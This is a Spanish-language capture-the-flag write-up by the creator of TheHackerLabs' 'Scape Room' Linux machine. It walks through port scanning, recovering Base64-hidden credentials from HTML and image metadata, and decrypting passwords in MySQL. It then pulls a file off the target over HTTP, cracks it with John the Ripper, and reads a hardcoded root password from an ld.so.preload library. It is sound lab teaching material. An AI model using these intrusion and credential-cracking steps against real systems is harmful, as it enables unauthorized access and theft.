---
title: "TheHackerLabs - Avanzado: [Scape Room]"
date: 2024-12-03 14:15:00 +0200
categories: [CTF, Writeups]
tags: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
image: /img/posts/CTF/Scaperoom/scaperoom.png
---

📛 **Nombre:** Scape Room | 📈 **Dificultad:** Avanzado | 💻 **SO:** Linux | 👨‍💻 **Creador:** @Oskitaar90

---

# 🕵️ Resolución del CTF: Scape Room

**Scape Room** es un reto avanzado diseñado para la comunidad de [**TheHackerLabs**](https://thehackerslabs.com/){:target="_blank"}. Este CTF es especial para mí porque, además de aprender mucho durante su creación, quise darle un enfoque realista inspirado en una experiencia de escape room. Cada paso del desafío tiene una lógica bien definida, combinando técnicas avanzadas con un límite de tiempo que agrega una presión realista y emocionante.

---

## 🌐 Entorno Inicial

- **IP de la máquina:** `192.168.1.41`
- **Servicios detectados:** 
  - **22/tcp - SSH:** OpenSSH 8.2p1 (Ubuntu)
  - **80/tcp - HTTP:** Apache/2.4.41
  - **3306/tcp - MySQL:** MySQL 8.0.39
- **Herramientas usadas:** Nmap, curl, WhatWeb, MySQL, Exiftool, John the Ripper.

---

## 🔍 Enumeración

### 🚪 Escaneo de Puertos

Realizamos un escaneo completo para identificar servicios expuestos:

```bash
sudo nmap -sSCV -p- -Pn -n --min-rate 5000 192.168.1.41
```

**Resultados destacados:**
- Puerto 22 (SSH): OpenSSH 8.2p1.
- Puerto 80 (HTTP): Apache/2.4.41.
- Puerto 3306 (MySQL): Versión 8.0.39.

---

### 🌐 Análisis HTTP

Accedemos al puerto 80 y encontramos una página web básica con un **timestamp dinámico** que cambia cada minuto. Tras inspeccionar el código fuente, no encontramos información adicional relevante.

Usamos **`whatweb --verbose`** para identificar más detalles del servidor:

```bash
`whatweb --verbose` http://192.168.1.41
```

**Resultados:**
- Tecnología: Apache 2.4.41, Ubuntu.
- Encabezados inusuales: `X-Hint`, `X-Contact`.

---

## 🔍 Investigación de Encabezados HTTP

El encabezado `X-Hint` menciona un subdominio. Añadimos este subdominio a `/etc/hosts`:

```bash
echo "192.168.1.41 info.sensores.thl" | sudo tee -a /etc/hosts
```

Al acceder a `http://info.sensores.thl`, encontramos una nueva página. Inspeccionando el código fuente, descubrimos un mensaje codificado en Base64.

```html
<!-- QSB2ZWNlcywgbG8gbcOhcyBvYnZpbyBlcyBsbyBxdWUgc2UgcGFzYSBwb3IgYWx0by4gVHUgw7puaWNhIHNhbGlkYSBlcyB2ZXIgbG8gcXVlIG90cm9zIG5vIHZlbi4gRWwgdGllbXBvIGNvcnJlIHkgY2FkYSBwaXN0YSBlcyB1bmEgcGllemEgY2xhdmUgZGVsIHJvbXBlY2FiZXphcy4K -->
```

Lo decodificamos con:

```bash
echo "QSB2ZWNlcy..." | base64 -d
```

**Salida:**
> "A veces, lo más obvio es lo que se pasa por alto. Tu única salida es ver lo que otros no ven."

---

## 🖼️ Análisis de Metadatos

Encontramos una imagen sospechosa en la página. Usamos **Exiftool** para extraer metadatos:

```bash
exiftool sensor_overview.png
```

**Salida destacada:**
- Comentario: `YWN1dGU6SVM0...`

Decodificamos el comentario Base64 y encontramos credenciales:

```bash
echo "YWN1dGU6SVM0..." | base64 -d
```

**Credenciales:**
- Usuario: `acute`
- Contraseña: `IS4yBvfwxpXUZsBxhCXr5muv3dXdQg!`

---

## 🔑 Acceso a MySQL

Conectamos al servicio MySQL en el puerto 3306:

```bash
mysql -u acute -p -h 192.168.1.41
```

Exploramos la base de datos y encontramos un **evento programado** deshabilitado. Lo activamos:

```sql
ALTER EVENT insert_login_data ENABLE;
```

Ahora, la tabla `login` genera credenciales cada minuto. Desencriptamos la contraseña directamente en MySQL:

```sql
SELECT CONVERT(AES_DECRYPT(UNHEX(password), 'encryption_key') USING utf8) 
AS decrypted_password FROM login WHERE usuario = 'administrador';
```

---

## 🔐 Desencriptando el Fichero leeme.txt.gpg

En nuestro directorio personal, encontramos un archivo encriptado llamado `leeme.txt.gpg`. Dado que la máquina no dispone de **John the Ripper**, necesitaremos transferir el archivo a nuestra máquina local para descifrarlo.

### 🌐 Descargando el archivo con Python

Creamos un servidor web sencillo en la máquina objetivo utilizando Python:

```bash
python3 -m http.server
```

Desde nuestra máquina local, descargamos el archivo mediante `wget`:

```bash
wget http://10.0.2.15:8000/leeme.txt.gpg
```

### 🔓 Cracking de la contraseña con John the Ripper

1. Convertimos el archivo a un formato compatible con John the Ripper usando `gpg2john`:
   ```bash
   gpg2john leeme.txt.gpg > leeme_hash.txt
   ```

2. Usamos John con el diccionario `rockyou.txt` para romper la clave:
   ```bash
   sudo john --wordlist=/usr/share/wordlists/rockyou.txt leeme_hash.txt
   ```

**Salida:**
> Clave encontrada: `superman1`.

### 🗝️ Descifrando el archivo

Con la clave obtenida, desciframos el archivo `leeme.txt.gpg` directamente en la máquina objetivo:

```bash
gpg --decrypt leeme.txt.gpg
```

**Salida del archivo:**
> "No todas las funciones tienen el control que parecen tener. Algunas veces, quien controla lo que se **carga primero** tiene la ventaja. Recuerda: la pre-carga puede ser tu mejor aliada... o tu perdición."

---

## 🛠️ Segundo Reto: Preloading

La pista sobre "pre-carga" nos lleva a investigar las bibliotecas precargadas del sistema. Utilizamos el comando `ldd` para inspeccionar las dependencias de `/bin/ls`:

```bash
ldd /bin/ls
```

**Salida:**
- Observamos una biblioteca inusual: `/lib/libscaperoom.so`.

Confirmamos que esta biblioteca está siendo precargada revisando el archivo `/etc/ld.so.preload`:

```bash
cat /etc/ld.so.preload
```

**Salida:**
> `/lib/libscaperoom.so`

---

## 🚀 Inspección y Escalada de Privilegios

Usamos `readelf` para inspeccionar las cadenas de texto incrustadas en la sección `.rodata`:

```bash
readelf -p .rodata /lib/libscaperoom.so
```

**Salida:**
- Función: `read`
- Contraseña: `rT8hQ9VcYb5kLmXo`
- Mensaje: `[+] Acceso root concedido!`

Usamos la contraseña obtenida para escalar privilegios:

```bash
su
Password: rT8hQ9VcYb5kLmXo
```

**Resultado:**
> Acceso root concedido. 🎉

---

## 🎉 Reflexión Final

Este CTF fue diseñado para ofrecer una experiencia desafiante y entretenida, con elementos que merecen destacarse:

- **Realismo:** El límite de tiempo y las pistas están pensadas para simular la presión de un escape room, donde cada decisión cuenta. Eso sí, no siempre podemos identificar los rabbit holes a tiempo, pero saber cuándo abandonar un camino que no lleva a nada es una habilidad crucial.
- **Progresión lógica:** Cada paso tiene un propósito claro y está conectado al siguiente, evitando frustraciones innecesarias.
- **Diversidad técnica:** Se abarcan múltiples aspectos, desde análisis de metadatos hasta descifrado de contraseñas y la manipulación de bibliotecas precargadas, lo que ofrece una buena mezcla de retos para cualquier jugador.

Espero que hayas disfrutado tanto resolviéndolo como yo creándolo. Este no es el final, sino el comienzo de muchos más retos por venir. ¡Nos vemos en el próximo desafío! 🚀